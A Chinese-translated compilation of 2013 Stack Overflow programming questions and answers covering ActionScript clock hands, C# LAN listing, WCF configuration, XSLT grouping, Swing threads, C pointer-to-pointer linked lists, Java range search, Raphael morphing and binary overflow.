我想将一条直线（例如代码中的秒针）旋转到特定角度，使其一端固定，我可以旋转它，但它的位置正在改变。如何在 ActionScript 3 中做到这一点？

```
 public function AnalogClockFace(face:Number)
    {
        this.size = face;
    }

    public  function draw():void
    {
        currentTime = new Date();
        showTime(currentTime);
    }

    public function init():void
    {
        this.graphics.clear();
        this.graphics.lineStyle(3.0,0x000000,3.0);
        this.graphics.beginFill(0xABC123,1.0);
        this.graphics.drawCircle(100,500,size);
        this.graphics.endFill();

        secondHand=new Shape();
        secondHand.graphics.lineStyle(2.0,0x000000,1.0);
        secondHand.graphics.moveTo(100,((500-size)+5));
        secondHand.graphics.lineTo(100,500);
        this.addChild(secondHand);
    }
    public function showTime(time:Date):void
    {
        var seconds:uint=time.getSeconds();
        var minutes:uint=time.getMinutes();
        var hours:uint=time.getHours();         

        this.secondHand.rotation = 180 + (seconds * 6);         
        this.minuteHand.rotation = 180 + (minutes * 6);
        this.hourHand.rotation = 180 + (hours * 30) + (minutes * 0.5);
    }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:27:44.973

这是因为焦点是左上角。所以它会围绕这个点进行旋转。必须以你为左中点的中间位置。为此，请创建`secondContainer`要添加的父容器名称`secondHand`。在该`secondHand`点移动到相对父级的中心位置之后。然后改变父容器的旋转。

在下面应用了上述代码的概念。复制和粘贴。

```
import flash.events.Event;
import flash.display.Sprite;
import flash.display.Shape;
import flash.geom.Point;

const CLOCK_CENTER_POINT = new Point(stage.stageWidth/2, stage.stageHeight/2);

var secondContainer:Sprite = new Sprite();
addChild(secondContainer);
secondContainer.x = CLOCK_CENTER_POINT.x;
secondContainer.y = CLOCK_CENTER_POINT.y;

var secondHand:Shape =new Shape();
const SECOND_LINE_WIDTH:Number = 2.0
const SECOND_LINE_HEIGHT:Number = 100;
secondHand.x = SECOND_LINE_WIDTH/2;
secondHand.y = -SECOND_LINE_HEIGHT;
secondHand.graphics.lineStyle(SECOND_LINE_WIDTH,0x000000,1.0);
secondHand.graphics.moveTo(0,SECOND_LINE_HEIGHT);
secondHand.graphics.lineTo(0,0);
secondContainer.addChild(secondHand);

var minContainer:Sprite = new Sprite();
addChild(minContainer);
minContainer.x = CLOCK_CENTER_POINT.x;
minContainer.y = CLOCK_CENTER_POINT.y;

var minHand:Shape =new Shape();
const MIN_LINE_WIDTH:Number = 2.0
const MIN_LINE_HEIGHT:Number = 80;
minHand.x = MIN_LINE_WIDTH/2;
minHand.y = -MIN_LINE_HEIGHT;
minHand.graphics.lineStyle(MIN_LINE_WIDTH,0x00ff00,1.0);
minHand.graphics.moveTo(0,MIN_LINE_HEIGHT);
minHand.graphics.lineTo(0,0);
minContainer.addChild(minHand);

var hourContainer:Sprite = new Sprite();
addChild(hourContainer);
hourContainer.x = CLOCK_CENTER_POINT.x;
hourContainer.y = CLOCK_CENTER_POINT.y;

var hourHand:Shape =new Shape();
const HOUR_LINE_WIDTH:Number = 2.0
const HOUR_LINE_HEIGHT:Number = 50;
hourHand.x = HOUR_LINE_WIDTH/2;
hourHand.y = -HOUR_LINE_HEIGHT;
hourHand.graphics.lineStyle(HOUR_LINE_WIDTH,0xff0000,1.0);
hourHand.graphics.moveTo(0,HOUR_LINE_HEIGHT);
hourHand.graphics.lineTo(0,0);
hourContainer.addChild(hourHand);

stage.addEventListener(Event.ENTER_FRAME, onEnter);

function onEnter(e:Event):void
{
    var time:Date = new Date();

    secondContainer.rotation = time.seconds*6+(time.milliseconds/(1000/6));
    minContainer.rotation = time.minutes*6+(time.seconds/10);
    hourContainer.rotation = time.hours*30+(time.minutes/2);
} 
```

# c# - 显示来自 LAN 的所有 IP 地址

> ID：15244407
> 
> 赞同：0
> 
> 时间：2013-03-06T10:11:34.917
> 
> 标签：c#, .net

我必须在 ListBox 中显示我的 LAN 的所有 IP 地址。当我试图将其绑定为空时。

// 代码

```
 Process netUtility = new Process(); 
        netUtility.StartInfo.FileName = "net.exe";

        netUtility.StartInfo.CreateNoWindow = true;

        netUtility.StartInfo.RedirectStandardOutput = true;

        netUtility.StartInfo.UseShellExecute = false;

        netUtility.StartInfo.RedirectStandardError = true;

        netUtility.Start();

        StreamReader streamReader = new StreamReader(netUtility.StandardOutput.BaseStream);

        string line = "";

        while ((line = streamReader.ReadLine()) != null)
        {

            if (line.StartsWith("\\"))
            {

                ListBox1.Items.Add(line.Substring(2).Substring(0, line.Substring(2).IndexOf(" ")).ToUpper());

            }

        }

        streamReader.Close();
        netUtility.WaitForExit(1000); 
```

我哪里错了？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:15:17.770

您可以在哪里简单地使用这种方法，更加灵活和易于使用/理解：

C# 代码：从此链接：[获取机器上的所有 IP 地址](https://stackoverflow.com/questions/5271724/get-all-ip-addresses-on-machine)

```
 // Get host name
String strHostName = Dns.GetHostName();

// Find host by name
IPHostEntry iphostentry = Dns.GetHostByName(strHostName);

// Enumerate IP addresses
int nIP = 0;
foreach(IPAddress ipaddress in iphostentry.AddressList)
{
    ....
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:14:32.400

需要在Process中添加一行。

// 代码

```
 netUtility.StartInfo.Arguments = "view"; 
```

现在它工作正常！！！

# c# - EndpointDispatcher 的 ContractFilter 不匹配？

> ID：15244414
> 
> 赞同：10
> 
> 时间：2013-03-06T10:11:56.620
> 
> 标签：c#, asp.net, wcf, iis-7.5, wcf-binding

在这里，我从浏览器中托管的 RESTful 服务调用该方法

```
https://eshop/LinkService/LinkService.svc/GetStudentObj 
```

并得到以下错误

```
The message with Action '' cannot be processed at the receiver, due to a ContractFilter mismatch at the EndpointDispatcher. This may be because of either a contract mismatch (mismatched Actions between sender and receiver) or a binding/security mismatch between the sender and the receiver. Check that sender and receiver have the same contract and the same binding (including security requirements, e.g. Message, Transport, None) 
```

配置文件

```
<system.serviceModel>
    <services>
      <service name="LinkService.LinkService" behaviorConfiguration="MyServiceBehavior">
        <endpoint address="" binding="webHttpBinding" bindingConfiguration="https" contract="LinkService.ILinkService" />
    <endpoint contract="IMetadataExchange" binding="mexHttpsBinding" address="mex" />
      </service>
    </services>
    <bindings>
      <webHttpBinding>
        <binding name="https">
          <security mode="Transport">
            <transport clientCredentialType="None" />
          </security>
        </binding>
      </webHttpBinding>
    </bindings>
    <behaviors>
      <serviceBehaviors>
        <behavior name="MyServiceBehavior">
          <!-- To avoid disclosing metadata information, set the value below to false and remove the metadata endpoint above before deployment -->
          <serviceMetadata httpGetEnabled="false" httpsGetEnabled="true"/>
          <!-- To receive exception details in faults for debugging purposes, set the value below to true.  Set to false before deployment to avoid disclosing exception information -->
          <serviceDebug includeExceptionDetailInFaults="true"/>
        </behavior>
      </serviceBehaviors>
      <endpointBehaviors>
        <behavior name="web">
          <webHttp/>
        </behavior>
      </endpointBehaviors>
    </behaviors>
<serviceHostingEnvironment aspNetCompatibilityEnabled="false" multipleSiteBindingsEnabled="true"/>
    <standardEndpoints>
      <webHttpEndpoint>
        <standardEndpoint name="" helpEnabled="true" automaticFormatSelectionEnabled="true"/>
      </webHttpEndpoint>
    </standardEndpoints>
  </system.serviceModel> 
```

和

```
 public Student GetStudent()
        {
            Student stdObj = new Student
            {
                StudentName = "Bala",
                Age = 29,
                Mark = 95
            };
            return stdObj;

        } 
```

和

```
 [ServiceContract]
    public interface ILinkService
    {
        [OperationContract]
        [WebInvoke(Method = "GET", UriTemplate = "/GetStudentObj", BodyStyle = WebMessageBodyStyle.Bare, RequestFormat = WebMessageFormat.Json,ResponseFormat = WebMessageFormat.Json)]
        Student GetStudent();
    } 
```

有什么建议吗？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-03-06T12:16:42.863

`<endpoint address />`在标签中添加行为配置

```
 <endpoint address="" binding="webHttpBinding" bindingConfiguration="https" contract="LinkService.ILinkService" behaviorConfiguration="web"/> 
```

# xml - XML - 使用 XSLT 将标签组合到子标签

> ID：15244416
> 
> 赞同：0
> 
> 时间：2013-03-06T10:11:59.780
> 
> 标签：xml, xslt

我有一个如下所示的 XML：

```
<?xml version="1.0"?>                                                                                                                                 
<ROWSET>                                                                                                                                              
 <ROW>                                                                                                                                                
  <KUNDENNR>63564</KUNDENNR>                                                                                                                          
  <JAHR>2012</JAHR>                                                                                                                                   
  <MONAT>2</MONAT>                                                                                                                                    
  <NAME>John Doe</NAME>                                                                                                                       
  <NETTO>504,66</NETTO>                                                                                                                               
  <DB_BASIS>21,56</DB_BASIS>                                                                                                                          
  <EKECHT>482,56</EKECHT>                                                                                                                             
  <NAME1>Some Name</NAME1>                                                                                                                       
  <NAME2>BA 31 (BÜRO GGR 1)</NAME2>                                                                                                                   
  <LAND>AT</LAND>                                                                                                                                     
  <PLZ>1082</PLZ>                                                                                                                                     
  <ORT>Wien</ORT>                                                                                                                                     
  <ADM>Henry Ford</ADM>                                                                                                                          
  <KUNDENKLASSE>A</KUNDENKLASSE>                                                                                                                      
  <UEBERKUNDE>Some Value</UEBERKUNDE>                                                                                                             
  <HANDLING>22,577179011</HANDLING>                                                                                                                   
  <SOLLFRACHT>22,68</SOLLFRACHT>              
  <DG_BASIS_P>-10,763888888888888888888888888888888889</DG_BASIS_P>                                                                                   
 </ROW> 
 <ROW>                                                                                                                                                
  <KUNDENNR>63564</KUNDENNR>                                                                                                                          
  <JAHR>2011</JAHR>                                                                                                                                   
  <MONAT>1</MONAT>                                                                                                                                    
  <NAME>John Doe</NAME>                                                                                                                       
  <NETTO>502,66</NETTO>                                                                                                                               
  <DB_BASIS>21,56</DB_BASIS>                                                                                                                          
  <EKECHT>482,56</EKECHT>                                                                                                                             
  <NAME1>Some Name</NAME1>                                                                                                                       
  <NAME2>BA 31 (BÜRO GGR 1)</NAME2>                                                                                                                   
  <LAND>AT</LAND>                                                                                                                                     
  <PLZ>1082</PLZ>                                                                                                                                     
  <ORT>Wien</ORT>                                                                                                                                     
  <ADM>Henry Ford</ADM>                                                                                                                          
  <KUNDENKLASSE>A</KUNDENKLASSE>                                                                                                                      
  <UEBERKUNDE>Some value</UEBERKUNDE>                                                                                                             
  <HANDLING>22,577179011</HANDLING>                                                                                                                   
  <SOLLFRACHT>22,68</SOLLFRACHT>              
  <DG_BASIS_P>-10,538888888888888888889</DG_BASIS_P>                                                                                   
 </ROW> 
</ROWSET> 
```

请注意，第一个和最后一个元素在 . 现在我想用 XSLT 将该 XML 转换为以下结构：

```
<?xml version="1.0"?>                                                                                                                                 
<ROWSET>                                                                                                                                              
 <KUNDE>
  <KUNDENNR>63564</KUNDENNR>                                                                                                                          
  <NAME>John Doe</NAME>      
  <NAME1>Some Name</NAME1>                                                                                                                       
  <NAME2>BA 31 (B RO GGR 1)</NAME2>                                                                                                                   
  <LAND>AT</LAND>                                                                                                                                     
  <PLZ>1082</PLZ>                                                                                                                                     
  <ORT>Wien</ORT>                                                                                                                                     
  <ADM>Henry Ford</ADM>                                                                                                                          
  <KUNDENKLASSE>A</KUNDENKLASSE>    
  <UEBERKUNDE>Some Value</UEBERKUNDE>                                                                                                              
    <ROW>                                                                                                                                                
        <JAHR>2012</JAHR>                                                                                                                                   
        <MONAT>2</MONAT>                                                                                                                                    
        <NETTO>504,66</NETTO>                                                                                                                               
        <DB_BASIS>21,56</DB_BASIS>                                                                                                                          
        <EKECHT>482,56</EKECHT>                                                                                                                             
        <HANDLING>22,577179011</HANDLING>                                                                                                                   
        <SOLLFRACHT>22,68</SOLLFRACHT>                                                                                                                      
        <DG_BASIS_P>4,27218325209051638727063765703642056038</DG_BASIS_P>                                                                                   
    </ROW>
    <ROW>
        <JAHR>2012</JAHR>                                                                                                                                   
        <MONAT>1</MONAT>                                                                                                                                    
        <NETTO>502,66</NETTO>                                                                                                                              
        <DB_BASIS>21,56</DB_BASIS>                                                                                                                        
        <EKECHT>482,56</EKECHT>                                                                                                                           
        <HANDLING>22,577179011</HANDLING>                                                                                                                    
        <SOLLFRACHT>22,68</SOLLFRACHT>                                                                                                                      
        <DG_BASIS_P>-10,538888888888888888889</DG_BASIS_P>                                                                                   
    </ROW>  
 </KUNDE> 
 </ROWSET> 
```

XML 是从数据库中导出的，我有必要将它变成一个更好的结构。我已经用 XSLT 尝试了几种不同的方法，但我是 XSLT 的新手，并希望寻求帮助。

先感谢您。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:37:04.107

您可以使用 XSLT 分组，这是 XSLT 2.0 的一个特性。

诀窍是使用 <xsl:for-each-group> 元素。

请注意，以下代码并不完整——您需要 <copy-of ...> 您需要的所有节点。

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:output method="xml" indent="yes" />

  <xsl:template match="ROWSET">
    <ROWSET>
      <xsl:for-each-group select="ROW" group-by="KUNDENNR">
        <KUNDE>
          <!-- this is the common part -->
          <xsl:copy-of select="NAME1" />
          <xsl:copy-of select="UEBERKUNDE" />

          <!-- iterate over every ROW in the group -->
          <xsl:for-each select="current-group()">
            <ROW>
              <xsl:copy-of select="JAHR" />
              <xsl:copy-of select="MONAT" />
            </ROW>
          </xsl:for-each>

        </KUNDE>
      </xsl:for-each-group>
    </ROWSET>
  </xsl:template>
</xsl:stylesheet> 
```

鉴于您的 XML 文档和上面的 XSLT，输出将是：

```
<?xml version="1.0" encoding="UTF-8"?>
<ROWSET>
   <KUNDE>
      <NAME1>Some Name</NAME1>
      <UEBERKUNDE>Some Value</UEBERKUNDE>
      <ROW>
         <JAHR>2012</JAHR>
         <MONAT>2</MONAT>
      </ROW>
      <ROW>
         <JAHR>2011</JAHR>
         <MONAT>1</MONAT>
      </ROW>
   </KUNDE>
</ROWSET> 
```

您还可以阅读[这篇文章](http://www.xml.com/lpt/a/1314)，其中有一些使用 for-each-group 的好例子。

# java - 如何用swing杀死线程？

> ID：15244425
> 
> 赞同：1
> 
> 时间：2013-03-06T10:12:37.900
> 
> 标签：java, multithreading, swing

我用 swing ui 创建了一个 java 程序。首先，当我单击一个按钮时，我遇到了一个问题，我无法单击另一个按钮。我应该等这个人完成他的任务。所以我创建了一个全局变量线程，并在动作事件中线程执行该方法。如以下代码中所述

```
private void jButton2ActionPerformed(java.awt.event.ActionEvent evt) {

        t = new Thread() {
            private int postion;

            public void run() {
                InstallApk installapk = new InstallApk();
                int position = 0;
                String fileName = directory;
                String shellCommand = fileName;

                // for (int position =0; postion < 105;position +5) {
                jProgressBar1.setValue(InstallApk.value);
                try {
                    Thread.sleep(500);
                } catch (InterruptedException e) {
                }
                position += 5;
                // }

                jProgressBar1.setIndeterminate(true);

                installapk.execShellCmd(shellCommand);
                System.out.println("la valeur d'execution " + InstallApk.value);

                if (InstallApk.value > 3) {
                    jProgressBar1.setIndeterminate(false);
                }
            }

        };
        pid = t.getId();
        t.start();
    } 
```

我想通过使用其他按钮来停止执行该线程。我试过 t.stop(); t.destroy(); 杀死 pid 但一直以来我都无法停止执行。在我的metod execShellCmd 的实现中，我使用了一个swing worker，但我的问题仍然是如何停止执行。

```
public static void execShellCmd(String cmd) {
        if (runningProcess != null) {
            // TODO print some suitable warning about process already running
            return;
        }
        try {

            //testPath = getPath();

            System.out.println("le chemin de travail.." +testPath);
            System.out.println(cmd);
            Runtime runtime = Runtime.getRuntime();
            process = runtime.exec(new String[] { "sh",
                    testPath + "/install.sh", cmd });
            new SwingWorker<Integer, Void>() {
                protected Integer doInBackground() {
                    // read process output first
                    BufferedReader buf = new BufferedReader(
                            new InputStreamReader(process.getInputStream()));
                    String line = "";
                    try {
                        while ((line = buf.readLine()) != null) {
                            System.out.println("exec response: " + line);
                            log = line;
                            writeToFile(line);
                            value ++;
                        }
                    } catch (IOException e1) {
                        // TODO Auto-generated catch block
                        e1.printStackTrace();
                    }
                     System.out.println("la valeur d'execution "+InstallApk.value);
                    // only once we've run out of output can we call waitFor
                    while (true) {
                        try {
                            return runningProcess.waitFor();
                        } catch (InterruptedException e) {
                            // do nothing, wait again
                        } finally {
                            Thread.interrupted();
                        }
                    }
                }
                protected void done() {
                    runningProcess = null;
                }
            }.execute();
        } catch (Exception e) {
            System.out.println(e);
        }
    } 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-06T10:29:36.230

从您提供的代码中，您可能希望总体上阅读 Swing 中的线程，因为听起来问题是由于不了解线程模型的工作原理而引起的。

本质上，您有一个事件调度线程，应该调用*所有*`SwingUtilities.invokeLater()`Swing 操作（如果您还没有在此 EDT 上，则使用它。）但是，根本不应该在 EDT 上执行长时间运行的任务，否则（如您发现) 它会锁定 GUI，直到它们完成。

如果你想执行一个长时间运行的任务，你的思路是正确的，但你通常会使用 a [`SwingWorker`](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/worker.html)，它允许异步执行一个长时间运行的任务，而且在任务完成时在 EDT 上提供回调.

就停止这样的线程而言，一种简单的方法是让它在执行时监视一个字段，并在您希望它停止时从 EDT 切换该字段（一个简单的操作）。不要使用该`stop()`方法或类似的方法，它们有很多问题（有充分的理由不推荐使用它们。）如果您使用的是，`SwingWorker`那么它具有内置的取消支持，使用它是明智的。

# c - 链表中指针的指针追加

> ID：15244429
> 
> 赞同：8
> 
> 时间：2013-03-06T10:12:49.673
> 
> 标签：c, list, pointers

我通常用python编程。为了提高我的模拟性能，我正在学习 C。在将附加函数实现到链表时，我很难理解指针的指针的使用。这是我的书 (Understanding Pointers in C by Kanetkar) 中代码的摘录。

```
#include <stdlib.h>
#include <stdio.h>

struct node{
    int data;
    struct node *link;
};

int main(){
    struct node *p; //pointer to node structure
    p = NULL;   //linked list is empty

    append( &p,1);
    return 0;
}

append( struct node **q, int num){
    struct node *temp, *r;  //two pointers to struct node
    temp = *q;

    if(*q == NULL){
        temp = malloc(sizeof(struct node));
        temp -> data = num;
        temp -> link = NULL;
        *q = temp;
    }
    else{
        temp = *q;
        while( temp -> link != NULL)
            temp = temp -> link;
        r = malloc(sizeof(struct node));
        r -> data = num;
        r -> link = NULL;
        temp -> link = r;
    }
} 
```

在这段代码中，我将双指针 **q 传递给 append 函数。我知道这是地址的地址，即在这种情况下为 NULL 的地址。

我只是不明白***为什么***有人这样做。从 append() 函数中的所有内容中删除一个 * 运算符并简单地将 NULL 的地址（即 p 而不是 &p）传递给 append() 函数是否无效？

我已经用谷歌搜索了这个问题。答案要么太难理解（因为我只是 C 初学者），要么太简单。我很感谢任何提示、评论或链接，我可以在这里阅读。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-03-06T10:22:23.067

当你将东西传递给 C 中的函数时，无论是它的变量还是指针，它都是原始的副本。

快速示例：

```
#include <stdio.h>
void change(char *in)
{
    // in here is just a copy of the original pointer.
    // In other words: It's a pointer pointing to "A" in our main case 
    in = "B";
    // We made our local copy point to something else, but did _not_ change what the original pointer points to.
}
void really_change(char **in)
{
    // We get a pointer-to-a-pointer copy. This one can give us the address to the original pointer.
    // We now know where the original pointer is, we can make _that one_ point to something else.
    *in = "B";
}
int main(int argc, char *argv[])
{
    char *a = "A";
    change(a);
    printf("%s\n", a); /* Will print A */
    really_change(&a);
    printf("%s\n", a); /* Will print B */
    return 0;
} 
```

因此，第一个函数调用`change()`会传递一个指向地址的指针的副本。当我们这样做时，`in = "B"`我们只更改我们传递的指针*的副本。*

在第二个函数调用中`really_change()`，我们得到了一个指向指针的副本。该指针包含指向我们原始指针的地址，瞧，我们现在可以引用原始指针并更改原始指针应指向的位置。

希望它能解释得更多:)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-03-06T10:22:43.097

首先它不是“地址的地址”。它是指针变量的地址。例如：如果您传递包含零的`int`变量的地址，则您不会传递零地址；`n`您正在传递一个变量的地址（在这种情况下是一个`int`变量，在您的情况下是一个指针变量）。变量在内存中有地址。在这种情况下，参数是恰好是指针变量的变量的地址，即列表的头部。

关于为什么要这样做？简单的。C 中的所有变量（不承受指针衰减的数组）都是按**值**传递的。如果你想通过引用（地址）来修改一些东西，那么你需要传递的“值”必须是一个地址，并且接收它的形参必须是一个指针类型。简而言之，您使传递的“值”成为一个内存地址，而不仅仅是一个基本的定标器值。然后该函数使用它（通过形式指针参数）相应地存储数据。可以把它想象成“把我想要的东西放在‘这个’内存地址”。

举个简短​​的例子，假设您想遍历一个文件，将其中的每个字符附加到节点的***前向***链接列表中。您*不会*使用您所拥有的附加方法（请参阅[The Painter's Algorithm](http://en.wikipedia.org/wiki/Schlemiel_the_Painter%27s_algorithm)了解原因）。看看您是否可以遵循此代码，该代码使用指针到指针，但没有函数调用。

```
typedef struct node
{
    char ch;
    struct node *next;
} node;

node *loadFile(const char *fname)
{
    node *head = NULL, **next = &head;
    FILE *fp = fopen(fname, "r");
    if (fp)
    {
        int ch;
        while ((ch = fgetc(fp)) != EOF)
        {
            node *p = malloc(sizeof(*p));
            p->ch = ch;
            *next = p;
            next = &p->next;
        }
        *next = NULL;
        fclose(fp);
    }
    return head;
} 
```

盯着看一会儿，看看你是否能理解指针指向指针`next`是如何用于始终填充要添加到列表中的下一个链接节点的，从头节点开始。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-03-06T10:43:14.903

您需要这样做才能使函数能够分配内存。简化代码：

```
main()
{
  void *p;
  p = NULL;
  funcA(&p);

  int i;
  i = 0;
  funcB(&i);
}

funcA(void **q)
{
  *q = malloc(sizeof(void*)*10);
}

funcB(int *j)
{
  *j = 1;
} 
```

此代码以这种方式完成，因此子函数`funcA`可以分配`p`指针。首先，考虑`void* p`好像它在哪里`int i`。你所做的事情`p = NULL`在某种程度上与`int i = 0`. 现在，如果您通过`&i`，您不通过地址`0`，而是通过地址`i`。`&p`传递指针的地址也会发生同样的事情。

现在在 funcA 中，您想要进行分配，所以您使用`malloc`但如果您这样做`q = malloc(...`并且 q 本来`void* q`在主函数中，p 将不会被分配。为什么？想一想`funcB`，j 持有 i 的地址，如果你想修改 i，你会这样做`*j = 1`，因为如果你这样做，`j = 1`那么你会让 j 指向另一个内存区域而不是 i。funcA 的 q 也一样。认为`<type of p>* q`它是指向 p 类型的指针，它是 void*，但对于 funcB，它是一个 int。现在你要修改 p 所指向的地址，也就是说你不想修改 q 所指向的地址，你要修改 q 所指向的地址，也就是`*q`or `p`。

如果还不清楚。试着想想盒子。我已经用所涉及的盒子的 funcA 绘制了一个简单的例子。每个盒子都有一个名称（在盒子内），这个盒子在进程的虚拟内存中的任意地址，每个盒子都包含一个值。在这个视图中，我们处于`funcA(&p)`调用了并且 malloc 将完成的状态。

![在此处输入图像描述](../Images/ac52bac3a6cbdff0823fac0d090722a0.png)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-03-06T10:23:39.560

嘿，为什么你这样想，想想当有人将结构传递给附加函数时，在这种情况下`struct node{int data; struct node *link; };`，你的整个结构将被复制到堆栈帧上`append function`，所以最好传递结构指针的地址以便得到 4字节复制到堆栈上。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-03-06T10:36:21.770

你不需要 if/else; 在这两种情况下，您都将新节点链接到在操作之前为 NULL 的指针。这可能是根节点，也可能是链中最后一个节点的 ->next 节点。两者都是指向结构节点的指针，您需要*指向*这些指针的指针才能分配给它们。

```
void append( struct node **q, int num){

    while (*q){ q = &(*q)->link; }

    *q = malloc(sizeof **q);
    (*q)->data = num;
    (*q)->link = NULL;

} 
```

为什么会有人这样做？基本上因为比较短，所以只用了一个循环，没有附加条件，没有使用附加变量，可以证明是正确的。当然应该为 malloc 的结果添加一个测试，这需要一个附加条件。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-03-06T10:36:59.783

本质上，正如 Jite 和其他人所说的那样是正确的。

每当您想将更改应用于 C 中的数据结构（由另一个函数执行的更改）时，您需要传递对此数据结构的“引用”，以使更改在 change() 函数完成后持续存在。这也是在 Python 中发生的事情，除非您显式地制作副本，否则您将引用传递给对象。在 C 语言中，您必须精确地指定要执行的操作。为了进一步简化它，它是：

类型 data_struct

change(data_struct) => 这是我的 data_struct 的副本，进行更改，但我不在乎调用者函数中您应用的更改

或者

change(&data_struct) => 这是我的 data_struct 的地址（“引用”），应用您的更改，调用者函数将在应用后看到此更改。

现在，根据原始“类型”是什么，您可能有 * 或 **。不过，请记住，您可以拥有多少“间接”是有限制的，不确定天气是否由系统或编译器确定，如果有人回答我是接受者的话。我从来没有超过3次间接。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-12-17T17:40:38.730

我认为原因如下：

结构节点 *p; //指向节点结构的指针 p = NULL;

以上代码段在主块中写入时，意味着指针 p 的值为 NULL，因此它不指向内存中的任何内容。所以我们传递指针 p 的地址以创建一个新节点并将新节点的地址分配给指针 p 的值。

*(&p) == *q == 温度；

通过做 *q == temp; 我们实现了为指针 p 分配一些值的目标，该指针最初指向无处。

# java - 查找具有范围之间属性的排序数组中的项目？

> ID：15244435
> 
> 赞同：0
> 
> 时间：2013-03-06T10:13:07.517
> 
> 标签：java, sorting, search

我有一个基于年龄字段按升序排序的类 Obj 数组。我需要在 O(log (N)) 时间的数组中找到年龄在给定的最小和最大年龄范围内的 Obj 项目的数量。

我认为我不能使用 binarySearch，因为 .equals 仅在名称和年龄相同时才成立。

这是我到目前为止所做的，但我不确定复杂性是什么。

```
public class Obj {
    private String name;
    private int age;

    private Obj(String name, int age) {
        if (name == null) {
             throw new IllegalArgumentException();
        }
        this.name = name;
        this.age = age;
    }

    public String getName() {
        return name;
    }

    public int getAge() {
        return age;
    }

    public boolean equals(Object o) {
        if (!(o instanceof Obj)) {
            return false;
        }

        Obj other = (Obj) o;
        return name.equals(other.getName()) && age == other.getAge();
    }

    public static Obj[] loadFromFile(File f) {
        // Loads from file and returns an array of Obj
    }
}

public static int getObjCountInRange(Obj[] a, int minAge, int maxAge) {
    if(a == null || (minAge < 0 || maxAge < 0) || (minAge > maxAge)) {
        throw new IllegalArgumentException();
    }

    int start = 0;
    for(int i = 0; i < a.length; i++) {
        if(a[i].getAge() >= minAge) {
            start = i;
            break;
        }
    }

    int end = 0;
    for(int i = a.length -1; i > 0; i--) {
        if(a[i].getAge() <= maxAge) {
            end = i;
            break;
        }
    }

    return (end - start) + 1;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:25:14.027

编写一个比较器并使用比较器对数组进行排序。

然后使用第二个二进制搜索签名，该签名将比较器与您的新比较器一起查找您的上限和下限。

如果您没有得到完全匹配，您将得到一个负数，这表示如果找到您的值，将其反转，您将获得满足边界条件的值的开始/结束位置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-20T12:55:39.443

这个问题与[此处](https://stackoverflow.com/questions/15242930/get-number-of-elements-in-a-sorted-array-that-fall-within-a-certain-range-in-log)相同，我在此处给出了**O(logn)**实现。

这个想法是通过范围二进制搜索来寻找下限和上限。对于您的示例，所有值都在谈论**年龄**值。

# javascript - 使用拖动事件来变形形状

> ID：15244444
> 
> 赞同：0
> 
> 时间：2013-03-06T10:13:21.600
> 
> 标签：javascript, jquery, raphael

我是拉斐尔的新手，正在制作动画。可以变形为上三角形或下三角形的钻石。动画中有五个点，我可以使用点击事件循环播放。我想要的是能够使用鼠标，以便在一次拖动中动画可以从任何一点移动到任何另一点。有谁知道如何实现这一点？

这是我的html：

```
<body>
  <div id='paper1'></div>
  <div class='animate'>
    <p>Animate!</p>
   </div>
</body> 
```

还有我的js：

```
$(document).ready(function(){
  var x = 0;
  var paper = Raphael('paper1', 500, 500); 
  var p1 = paper.path("M200,200 L 250,230 L 300,200 L250,170 Z")
  p1.attr({"stroke-width": 4, fill: "red"});

  $('.animate').click(function(){
     morph(p1,x);
     x ++;
     if (x === 8) x = 0;
  });
});

var morph = function(shape, count){
  console.log(count);
  if (count === 0) path =      {path:"M200,200 L250,200 L300,200 L250,90 Z"};
  else if (count === 1) path = {path:"M200,200 L250,200 L300,200 L250,10 Z"};
  else if (count === 2) path = {path:"M200,200 L250,200 L300,200 L250,90 Z"};
  else if (count === 3) path = {path:"M200,200 L250,230 L300,200 L250,170 Z"};
  else if (count === 4) path = {path:"M200,200 L250,310 L300,200 L250,200 Z"};
  else if (count === 5) path = {path:"M200,200 L250,390 L300,200 L250,200 Z"};
  else if (count === 6) path = {path:"M200,200 L250,310 L300,200 L250,200 Z"};
  else if (count === 7) path = {path:"M200,200 L 250,230 L 300,200 L250,170 Z"};

  shape.animate(path,300);
} 
```

非常感谢任何帮助。

C

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T17:43:35.520

玩了一段时间后解决了这个问题。如果有人感兴趣，这是我的解决方案。 [https://github.com/cmcguire79/raphael-widget](https://github.com/cmcguire79/raphael-widget)

# binary - 添加二进制文件和溢出

> ID：15244445
> 
> 赞同：0
> 
> 时间：2013-03-06T10:13:22.457
> 
> 标签：binary, overflow, addition, binaries

我正在练习我的二进制加法并溢出我猜，我需要答案是 5 位来添加 01010 和 11011，以节省十进制 10 和 27 的时间

添加后，我得到 100101，这是 37 的预期答案。

但是，由于答案必须是 5 位，这是否意味着我将位放在左侧，即 1？我对此感到困惑，因为这不是答案 5 吗？而不是37？因为它将是 00101，或者这只是计算机的操作方式？

也有人可以阐明以下两个问题的含义吗？

进位到最高有效位的值是多少？

最高有效位的进位值是多少？

任何帮助和澄清将不胜感激。

辛

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:16:42.983

如果你只有 5 位，那么是的，二进制 10+27 的答案是 5，因为你可以存储在 5 位中的最大值是 2^5 - 1 = 31d = 11111b。包括 0，您可以在 5 位变量中存储 32 个不同的值。所以你的结果是 37mod32 = 5。

最高有效位是具有最高值的位，在您的情况下是最左边的位。该位如果为 1，则具有十进制值 16。

